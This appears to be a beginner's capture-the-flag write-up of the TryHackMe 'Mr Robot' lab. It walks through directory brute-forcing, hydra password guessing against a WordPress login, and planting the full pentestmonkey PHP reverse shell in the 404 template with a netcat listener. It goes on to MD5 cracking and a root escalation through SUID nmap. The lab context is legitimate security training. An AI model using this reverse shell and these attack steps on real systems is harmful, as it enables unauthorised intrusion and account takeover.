# TryHackMe-MR_Robot_CTF

H4ppy H4ck1ng Br0


![image](https://user-images.githubusercontent.com/64806211/127406438-801cc0a5-3311-4532-89fa-6c51ef9a77d2.png)
 
 
 
 You can find the room here:
 
 https://tryhackme.com/room/mrrobot
 
 
 
 
 `Description`
 
 
 
 
 Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

Credit to Leon Johnson for creating this machine.
 
 
 ### **Recon__** 
 
 
 
nmap -A 10.10.227.36 shows that there are 997 filtered port and port 22, 80 and 443 are filtered. This means that there is some kind of firewall blocking the nmap scans


Lets open the website anyway. the http site give a browser based shell with only few commands. The https site has a self signed certificate, and it also does the same thing



![hdh](https://user-images.githubusercontent.com/64806211/127406829-e28231df-20b3-4f41-a636-9ffcb6107fae.png)
 
 
 
Before trying some commands let’s view the source code: 



![image](https://user-images.githubusercontent.com/64806211/128553822-6d7c47e2-38cb-4114-b6f3-cb6fbacaaaaa.png)





Okay nothing interesting. Let’s try the commands: 




`prepare - shows us a video`


`fsociety - shows us a video too`


`inform - shows us pictures`



`question - shows us a video`



`wakeup - same`


`join - we need to type in our email but then nothing happens`





Now we need to bruteforce the directories with gobuster:





  
  `gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt` 
  
  
  
  Commands: 
  
  
  
  
  
  `dir – specify that we want to bruteforce the directories`



`-u – for the url`



`-w – path to the wordlist that we want to use`





Output:




![image](https://user-images.githubusercontent.com/64806211/128554730-eb933216-1996-4cbf-9f3c-f8bfa321fba4.png)



Note: I missed to screenshot the robots.txt directory. 






Let’s head into the robots.txt directory: 



`User-agent: *`


`fsocity.dic`



`key-1-of-3.txt`



Sweet. We have a dictionary and the first flag. We can use wget to download them both: 


`wget http://$IP/fsocity.dic`



`wget http://$IP/key-1-of-3.txt`



Now look again at the directories. We can see there is a blog running. Let’s head into “/dashboard”:





![image](https://user-images.githubusercontent.com/64806211/128555625-da04cbdf-09aa-45eb-a3d7-4fcb157f5481.png)
 
 
 
 
 Oh yes we can see we have wordpress running. Maybe we can bruteforce it with hydra using the username elliot?

 
 
 
 
 `hydra -l elliot -P #path to fsocity.dic $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -V` 
 
 
 
 
 Commands: 
 
 
 
 
 `-l` – specify the username(-L for username list)
 
 

`-P` – specify the wordlist for password(-p for a single password)


http-post-form – we are bruteforcing the post form so we need this to specify what are we looking for. 




`-V` – verbose mode so we can see every try 


Great we found the password. Now let’s use the 404 template as a reverse shell. Let me show you how: 



navigate to Appearance –> Editor –> then on the right click 404 Template:



![image](https://user-images.githubusercontent.com/64806211/128556964-24b2d9ae-9855-4144-8086-7a06a25aabc3.png) 



Now we need to change the php code with the code from our reverse shell and we can gain access:



#code to use for the reverse shell:



<?php


// php-reverse-shell - A Reverse Shell implementation in PHP


// Copyright (C) 2007 pentestmonkey@pentestmonkey.net


//


// This tool may be used for legal purposes only.  Users take full responsibility


// for any actions performed using this tool.  The author accepts no liability


// for damage caused by this tool.  If these terms are not acceptable to you, then


// do not use this tool.


//


// In all other respects the GPL version 2 applies:


//


// This program is free software; you can redistribute it and/or modify


// it under the terms of the GNU General Public License version 2 as


// published by the Free Software Foundation.


//


// This program is distributed in the hope that it will be useful,


// but WITHOUT ANY WARRANTY; without even the implied warranty of


// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the


// GNU General Public License for more details.


//


// You should have received a copy of the GNU General Public License along


// with this program; if not, write to the Free Software Foundation, Inc.,


// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.


//



// This tool may be used for legal purposes only.  Users take full responsibility


// for any actions performed using this tool.  If these terms are not acceptable to


// you, then do not use this tool.


//


// You are encouraged to send comments, improvements or suggestions to


// me at pentestmonkey@pentestmonkey.net


//


// Description


// -----------


// This script will make an outbound TCP connection to a hardcoded IP and port.


// The recipient will be given a shell running as the current user (apache normally).


//


// Limitations


// -----------


// proc_open and stream_set_blocking require PHP version 4.3+, or 5+


// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.


// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.


//


// Usage


// -----


// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.





set_time_limit (0);


$VERSION = "1.0";


$ip = '**********';  // CHANGE THIS


$port = 1234;       // CHANGE THIS


$chunk_size = 1400;


$write_a = null;


$error_a = null;


$shell = 'uname -a; w; id; /bin/sh -i';


$daemon = 0;


$debug = 0;



//


// Daemonise ourself if possible to avoid zombies later



//



// pcntl_fork is hardly ever available, but will allow us to daemonise



// our php process and avoid zombies.  Worth a try...


if (function_exists('pcntl_fork')) {

 

// Fork and have the parent process exit

 

$pid = pcntl_fork();

 


 
if ($pid == -1) {

  

printit("ERROR: Can't fork");

  

exit(1);

 

}

 


 
if ($pid) {

  

exit(0);  // Parent exits

 
}


 
// Make the current process a session leader

 

// Will only succeed if we forked

 
if (posix_setsid() == -1) {

  

printit("Error: Can't setsid()");

  

exit(1);

 

}




 
$daemon = 1;


} else {

 
printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");


}





// Change to a safe directory


chdir("/");




// Remove any umask we inherited




umask(0);



//



// Do the reverse shell...



//




// Open reverse connection




$sock = fsockopen($ip, $port, $errno, $errstr, 30);




if (!$sock) {

 


printit("$errstr ($errno)");

 


exit(1);



}




// Spawn shell process





$descriptorspec = array(

   



0 => array("pipe", "r"),  // stdin is a pipe that the child will read from

   



1 => array("pipe", "w"),  // stdout is a pipe that the child will write to

   


2 => array("pipe", "w")   // stderr is a pipe that the child will write to



);




$process = proc_open($shell, $descriptorspec, $pipes);




if (!is_resource($process)) {

 

printit("ERROR: Can't spawn shell");

 

exit(1);




}




// Set everything to non-blocking



// Reason: Occsionally reads will block, even though stream_select tells us they won't



stream_set_blocking($pipes[0], 0);




stream_set_blocking($pipes[1], 0);



stream_set_blocking($pipes[2], 0);



stream_set_blocking($sock, 0);




printit("Successfully opened reverse shell to $ip:$port");




while (1) {

 
// Check for end of TCP connection

 

if (feof($sock)) {

  


printit("ERROR: Shell connection terminated");

  

break;

 

}


 


// Check for end of STDOUT

 


if (feof($pipes[1])) {

  


printit("ERROR: Shell process terminated");

  


break;

 


}


 


// Wait until a command is end down $sock, or some

 


// command output is available on STDOUT or STDERR

 


$read_a = array($sock, $pipes[1], $pipes[2]);

 


$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);


 


// If we can read from the TCP socket, send

 


// data to process's STDIN

 


if (in_array($sock, $read_a)) {

  


if ($debug) printit("SOCK READ");

  


$input = fread($sock, $chunk_size);

  




if ($debug) printit("SOCK: $input");

  


fwrite($pipes[0], $input);

 

}




 
// If we can read from the process's STDOUT

 

// send data down tcp connection

 

if (in_array($pipes[1], $read_a)) {

  


if ($debug) printit("STDOUT READ");

  


$input = fread($pipes[1], $chunk_size);

  


if ($debug) printit("STDOUT: $input");

  

fwrite($sock, $input);

 

}


 

// If we can read from the process's STDERR

 

// send data down tcp connection

 


if (in_array($pipes[2], $read_a)) {

  



if ($debug) printit("STDERR READ");

  



$input = fread($pipes[2], $chunk_size);

  





if ($debug) printit("STDERR: $input");

  




fwrite($sock, $input);

 


}



}




fclose($sock);



fclose($pipes[0]);




fclose($pipes[1]);



fclose($pipes[2]);




proc_close($process);




// Like print, but does nothing if we've daemonised ourself




// (I can't figure out how to redirect STDOUT like a proper daemon)





function printit ($string) {

 




if (!$daemon) {

  


print "$string\n";

 



}



}




?> 




Okay now paste it into the 404 template and set up a netcat listener:





`nc -lvnp 1234` 



Now save the 404 template and go to “http://$IP/404.php&#8221;. And just like that we have a reverse shell. Now let’s stabilize it a little bit: 




python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm 



Now let’s see what we have into “robot” home folder:




![image](https://user-images.githubusercontent.com/64806211/128558382-51230099-a1c8-4e80-bd66-20ba83422764.png)




Hmmmm if we try to cat the key-2-of-3.txt we get a permission denied so let’s see what this password.raw-md5 is: 




`cat password.raw-md5`




`#output`




`robot:c3fcd3d76192e4007dfb496cca67e13b`




And if we crack it using an online md5 decrypter we get the password for the user robot. Now let’s change users:



`su robot`




`Enter password:`



And boom we are robot. Now let’s cat out the key-2-of-3.txt and see what we can do: 




`find / -perm +6000 2>/dev/null | grep '/bin/'`





![image](https://user-images.githubusercontent.com/64806211/128559112-929202f8-190e-4f6c-a7e7-9ae79130b18c.png)







Oh shiiiiiiiiit we can see nmap is running as root process so we can use it to get a root shell:




`nmap --interactive` 




![image](https://user-images.githubusercontent.com/64806211/128559387-c8782cbd-4599-4be1-a935-47eff8788c4b.png)




BOOM BOOM BOOM
we just completed the box. High five, yeah. Again thank you for the support, i hope you liked the write-up and expect more in the future.
